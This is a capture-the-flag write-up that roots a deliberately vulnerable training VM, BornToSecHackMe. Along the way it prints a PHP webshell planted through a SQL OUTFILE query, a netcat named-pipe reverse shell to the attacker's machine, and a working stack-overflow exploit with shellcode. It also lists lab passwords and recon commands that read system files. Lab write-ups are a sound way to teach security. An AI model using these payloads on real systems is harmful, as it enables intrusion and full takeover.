# WRITEUP 1

## STEP 1 : Forum

![](https://github.com/bhm-heddy/tmpb2r/blob/master/ressources/screenshots/forum_01.png)

In *Probleme login* topic, we found the lmezard login problem : 

```
Oct 5 08:44:40 BornToSecHackMe sshd[7482]: input_userauth_request: invalid user test [preauth]
Oct 5 08:44:40 BornToSecHackMe sshd[7482]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 08:44:40 BornToSecHackMe sshd[7482]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
[...]
Oct 5 08:45:26 BornToSecHackMe sshd[7547]: Invalid user adam from 11.202.39.38
Oct 5 08:45:26 BornToSecHackMe sshd[7547]: input_userauth_request: invalid user adam [preauth]
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
[..]
Oct 5 17:23:01 BornToSecHackMe CRON[507]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 17:23:01 BornToSecHackMe CRON[507]: pam_unix(cron:session): session closed for user root
Oct 5 17:24:01 BornToSecHackMe CRON[550]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 17:51:01 BornToSecHackMe CRON[1739]: pam_unix(cron:session): session closed for user root
Oct 5 17:51:15 BornToSecHackMe sshd[1782]: Accepted password for admin from 62.210.32.157 port 56754 ssh2
Oct 5 17:51:15 BornToSecHackMe sshd[1782]: pam_unix(sshd:session): session opened for user admin by (uid=0)
```

This line is interesting : `Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2` 
After test all services, we can just connect to forum with `lmezard - !q\]Ej?*5K5cy*AJ` 

![](https://github.com/bhm-heddy/tmpb2r/blob/master/ressources/screenshots/forum_02.png)

In setting account, we find lmezard's mail : `laurie@borntosec.net` 


## STEP 2 : Webmail 

![](https://github.com/bhm-heddy/tmpb2r/blob/master/ressources/screenshots/webmail_01.png)

Inside we read mail with credentials for connect to database

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

## STEP 3 : PhpMyAdmin 

We can try SQL injection. After few try, we find only one path where we can write, so we run this injection for create backdoor with Webshell : 

`SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>" INTO OUTFILE '/var/www/forum/templates_c/bd.php' `

![](https://github.com/bhm-heddy/tmpb2r/blob/master/ressources/screenshots/webshell_01.png)

We take the opportunity to take more information on the target :

`cat /etc/*-release`
`cat /etc/*-version`
`uname -a`
`cat /etc/passwd`
`cat /etc/ssh/sshd_config/`
`find / -maxdepth 3 -type d -perm -777 2>/dev/null` 
...

to be more comfortable, we gonna create real reverse shell :

On my Vm : 
`rlwrap -r pwncat -l 4444 -vv` 

On the target, `nc` haven't `-e` option, we have to bypass this : 
`mknod /tmp/backpipe p `
`/bin/bash 0</tmp/backpipe 2>&1 | nc my_ip_vm 4444 1>/tmp/backpipe`

![](https://github.com/bhm-heddy/tmpb2r/blob/master/ressources/screenshots/reverse_shell_01.png)

We have now a new id `lmezard:G!@M6f4Eatau{sF"` 

lmezard doesnt allow to connect with ssh

## STEP 4 : FTP

We can connect to ftp with previos login. Inside we find file name `fun`. 

After downloading it, we know it's an archive tar.
`mv fun fun.tar`
`tar xvf fun.tar`

Inside 750 file {name}.pcap but apparently unrelated to network traffic.

` cat $(ls -1 | head -n 5) `
```
void useless() {

//file12}void useless() {

//file265}void useless() {

//file355}void useless() {

//file82        printf("Hahahaha Got you!!!\n");

//file142    
```

Each file, have one line C code and a file number, with script `ft_fun_script.sh`, we can put the files back in order to result `Iheartpwnage` 

This ouput doesn't work to connect to the next level. We try differnt hash and got it with sha256 :

` echo -n $(ft_fun_script.sh)  | sha256sum`

`330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

## STEP 6 : Laurie

We can now connect on the server with ssh

`ssh target@laurie`

In the home : 
```
cat README 
Diffuse this bomb!
```
And one binary : `bomb`  : it is a treasure hunt with 6 entries. 
We use radare2 to reverse it and find all answers, finaly:
```
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9
So you got that one.  Try this one.
opekmq
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!
```
All input give password for next level `thor - Publicspeakingisveryeasy.126241207201b2149opekmq426135`

## STEP 7

`ssh target@thor`
In the home : 
```
cat README 
Finish this challenge and use the result as password for 'zaz' user.
```
And one file text `turtle` with lots of instructions. 

Thanks python script we parse and executed turtle instructions.
This give us a word : `SLASH`. It doesn't work for connect zaz user
We try all hash and work with MD5 : `646da671ca01bb5d84dbb5fb2238dc8e`

## STEP 8

`ssh target@zaz`
In the home : one binary `exploit_me`. It take 1 argument and print it.
With `nm`, `strace` and `ltrace` , we understand that argument is copy in buffer with 140 len.

We may be use a buffer overflow ? 
checksec imform us that binary haven't protect 
```
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
```
Stack is executable :
```
readelf exploit.me  | grep gnu_stack
GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```

And ASLR is disable 
```
cat /proc/sys/kernel/randomize_va_space 
0
```
So we can implement a BoF :

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
   0x080483f7 <+3>:     and    esp,0xfffffff0
   0x080483fa <+6>:     sub    esp,0x90
   0x08048400 <+12>:    cmp    DWORD PTR [ebp+0x8],0x1
   0x08048404 <+16>:    jg     0x804840d <main+25>
   0x08048406 <+18>:    mov    eax,0x1
   0x0804840b <+23>:    jmp    0x8048436 <main+66>
   0x0804840d <+25>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048410 <+28>:    add    eax,0x4
   0x08048413 <+31>:    mov    eax,DWORD PTR [eax]
   0x08048415 <+33>:    mov    DWORD PTR [esp+0x4],eax
   0x08048419 <+37>:    lea    eax,[esp+0x10]
   0x0804841d <+41>:    mov    DWORD PTR [esp],eax
   0x08048420 <+44>:    call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:    lea    eax,[esp+0x10]
   0x08048429 <+53>:    mov    DWORD PTR [esp],eax
   0x0804842c <+56>:    call   0x8048310 <puts@plt>
   0x08048431 <+61>:    mov    eax,0x0
   0x08048436 <+66>:    leave  
   0x08048437 <+67>:    ret    
End of assembler dump.
```


After find EIP address and Buffer address, we create our playload :

$(python -c 'print "\x90" * 95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x40\xf6\xff\xbf"')



```
zaz@BornToSecHackMe:~$ $PWD/exploit_me $(python -c 'print "\x90" * 95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xa4\xf8\xff\xbf"')
������������������������������������������������������������������������������������������������^�1��F�F
                                                                                                        �
                                                                                                         ����V
                                                                                                              1ۉ�@�����/bin/sh����
# whoami
root
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
```
We are root shell but our uid isn't `0`, so we will add zaz in sudo users

`usermod -aG sudo zaz` and we re login with zaz user

```
ssh zaz@target
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
zaz@target's password: 
zaz@BornToSecHackMe:~$ whoami
zaz
zaz@BornToSecHackMe:~$ sudo su
[sudo] password for zaz: 
root@BornToSecHackMe:/home/zaz# id
uid=0(root) gid=0(root) groups=0(root)
```

We are root ! 
                                                              
	

